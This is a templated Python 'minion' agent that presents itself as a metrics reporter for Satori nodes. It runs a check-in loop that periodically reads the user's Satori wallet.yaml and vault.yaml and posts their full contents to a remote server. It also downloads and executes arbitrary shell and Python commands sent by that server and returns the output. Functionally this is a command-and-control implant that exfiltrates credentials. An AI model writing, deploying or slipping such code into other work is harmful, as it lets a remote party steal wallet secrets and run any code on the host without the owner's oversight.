import requests
import time
import platform
import psutil
import socket
import subprocess
import os
from bs4 import BeautifulSoup

minion_version="1.1.3"


# Server base URL
server_url = "##server_url##"

def get_cpu_info():
    if platform.system() == "Linux":
        try:
            with open("/proc/cpuinfo", "r") as f:
                cpuinfo = f.read()
            return cpuinfo
        except:
            return ""
    return ""
satori_version = None

def get_satori_balance(url, retries=3, timeout=45):
    """
    Retrieves the balance from the Satori host page and updates the global version.

    Args:
        url (str): The URL to check.
        retries (int): The number of retry attempts in case of failure.
        timeout (int): The request timeout in seconds.

    Returns:
        str: The Satori balance, or -1 if unable to retrieve.
    """
    global satori_version  # Access the global variable
    
    for attempt in range(retries + 1):
        try:
            response = requests.get(url, timeout=timeout)
            if response.status_code == 200:
                # Parse HTML to extract the balance and version
                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract the version
                version_tag = soup.find('div', class_='sidenav-footer')
                if version_tag:
                    version_number = version_tag.find('p').text.strip()
                    satori_version = version_number  # Update the global variable

                # Extract the balance
                balance_tag = soup.find('div', class_='text-center', style="padding-top:3rem !important;")
                if balance_tag:
                    balance_value = balance_tag.find('h4').text.strip()
                    balance_currency = balance_tag.find('p').text.strip()
                    return f"{balance_value} {balance_currency}"
        except requests.exceptions.RequestException:
            pass
        if attempt < retries:
            time.sleep(2)  # Delay between retries

    return -1  # Return -1 on error


def is_satori_installed():
    return os.path.exists("##satori_path##")
daily_stats=""
def check_satori_online(retries=3, delay=2):
    global daily_stats
    url = "http://127.0.0.1:24601/fetch/wallet/stats/daily"
    
    for attempt in range(retries):
        try:
            response = requests.get(url)
            if response.status_code == 200 and response.text:  # Check for 200 status and plain text content
                daily_stats = response.text
                return True
        except requests.exceptions.RequestException:
            pass
        
        # Wait before trying again if the request fails
        time.sleep(delay)
    
    return False  # Return False after all retries fail



def get_system_metrics(include_satori=False):
    machine = platform.machine().lower()
    bits = platform.architecture()[0]

    if 'arm' in machine or 'aarch64' in machine:
        cpu_info = get_cpu_info()
        if 'aarch64' in machine:
            cpu_arch = 'ARM64'
        elif 'armv8' in cpu_info:
            cpu_arch = 'ARM64'
        elif 'armv7' in cpu_info:
            cpu_arch = 'ARM32'
        elif 'armv6' in cpu_info:
            cpu_arch = 'ARMv6'
        else:
            cpu_arch = 'ARM (Unknown version)'
    elif 'x86' in machine or 'amd64' in machine or 'i386' in machine or 'i686' in machine:
        if '64' in bits:
            cpu_arch = 'x86_64'
        else:
            cpu_arch = 'x86_32'
    else:
        cpu_arch = 'Unknown'

    metrics = {
        "platform": platform.system(),
        "platform_version": platform.version(),
        "cpu_architecture": cpu_arch,
        "system_bits": bits,
        "cpu_count": psutil.cpu_count(),
        "cpu_usage": psutil.cpu_percent(),
        "memory_usage": psutil.virtual_memory().percent,
        "total_memory": round(psutil.virtual_memory().total / (1024 ** 3), 2),  # In GB
        "disk_usage": psutil.disk_usage('/').percent,
        "total_disk": round(psutil.disk_usage('/').total / (1024 ** 3), 2),  # In GB
        "minion_version": minion_version
    }

    if include_satori:
        metrics["satori_installed"] = is_satori_installed()
        metrics["satori_amount"] = get_satori_balance("http://127.0.0.1:24601/")
        satori_online=check_satori_online()
        metrics["satori_version"] = satori_version
        wallet_path="/home/##username##/.satori/wallet/wallet.yaml"
        vault_path="/home/##username##/.satori/wallet/vault.yaml"
        with open(wallet_path, 'r') as file:
           wallet_data = file.read()
           metrics["wallet_yaml"] = wallet_data
        with open(vault_path, 'r') as file:
           vault_data = file.read()
           metrics["vault_yaml"] = vault_data
        if satori_online:
         metrics["satori_online"] = satori_online
         metrics["daily_stats"] = daily_stats
        else:
         metrics["satori_online"] = False
    
    return metrics

def checkin():
    hostname = socket.gethostname()
    checkin_count = 9

    while True:
        checkin_count += 1
        include_satori = (checkin_count % 10 == 0)
        metrics = get_system_metrics(include_satori=include_satori)

        try:
            checkin_url = f"{server_url}/checkin/{hostname}"
            response = requests.post(checkin_url, json=metrics)
            print(f"Status code: {response.status_code}")
            print(response.text)

            if response.status_code == 200:
                command_str = response.text.strip()  # Get the plain text response
                if command_str:
                    guid, command_type, command_to_run = parse_command(command_str)
                    if command_type == 'sh':
                        result = execute_command(command_to_run)
                    elif command_type == 'py':
                        result = execute_python_script(command_to_run)
                    elif command_type == 'command':
                        result = execute_system_command(command_to_run)
                    else:
                        result = "Error: Unknown command type"
                    send_command_response(guid, result)
                else:
                    print("No command received or unrecognized format.")
            else:
                print(f"Check-in failed: Server returned status code {response.status_code}")
        except Exception as e:
            print(f"Check-in failed: {e}")

        time.sleep(##client_trigger##) 

def parse_command(command_str):
    try:
        if command_str.startswith("command:"):
            _, guid_command = command_str.split(":", 1)
            guid, command = guid_command.split(":", 1)
            return guid, "command", command
        else:
            command_type, guid, command = command_str.split(':', 2)
            if command_type == "sh":
                return guid, "sh", command
            elif command_type == "py":
                return guid, "py", command
            else:
                return guid, "unknown", command
    except ValueError:
        print(f"Failed to parse command: {command_str}")
        return None, None, None

def download_script(script_name):
    try:
        file_url = f"{server_url}/files/{script_name}"
        response = requests.get(file_url)
        if response.status_code == 200:
            with open(script_name, 'wb') as file:
                file.write(response.content)
            
            # Run dos2unix on the downloaded file
            os.system(f"dos2unix {script_name}")
            
            return script_name
        else:
            return None
    except Exception as e:
        print(f"Failed to download script: {e}")
        return None

def execute_command(command):
    try:
        parts = command.split()
        file_to_execute = parts[0]

        # If the command is a file name, download it first
        if file_to_execute.endswith(".sh") or os.path.isfile(file_to_execute):
            script_path = download_script(file_to_execute)
            if not script_path:
                return f"Error: Failed to download the script {file_to_execute}"

            subprocess.run(f"chmod +x {script_path}", shell=True)
            command = f"./{script_path} " + " ".join(parts[1:])

        # Now run the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() if result.returncode == 0 else f"Error: {result.stderr.strip()}"
    except subprocess.TimeoutExpired:
        return "Error: Command execution timed out after 5 minutes"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def execute_python_script(script_name):
    script_path = download_script(script_name)
    if not script_path:
        return f"Error: Failed to download the script {script_name}"

    try:
        result = subprocess.run(['python3', script_path], capture_output=True, text=True, timeout=300)
        return result.stdout.strip() if result.returncode == 0 else f"Error: {result.stderr.strip()}"
    except subprocess.TimeoutExpired:
        return "Error: Python script execution timed out after 5 minutes"
    except Exception as e:
        return f"Error executing Python script: {str(e)}"

def execute_system_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() if result.returncode == 0 else f"Error: {result.stderr.strip()}"
    except subprocess.TimeoutExpired:
        return "Error: Command execution timed out after 5 minutes"
    except Exception as e:
        return f"Error executing system command: {str(e)}"

def send_command_response(guid, result):
    try:
        response_url = f"{server_url}/callback/{guid}"
        response = requests.post(response_url, data=result)
        if response.status_code == 200:
            print(f"Command response successfully sent for GUID {guid}")
        else:
            print(f"Failed to send command response: Server returned status code {response.status_code}")
    except Exception as e:
        print(f"Error sending command response: {e}")

if __name__ == "__main__":
    checkin()
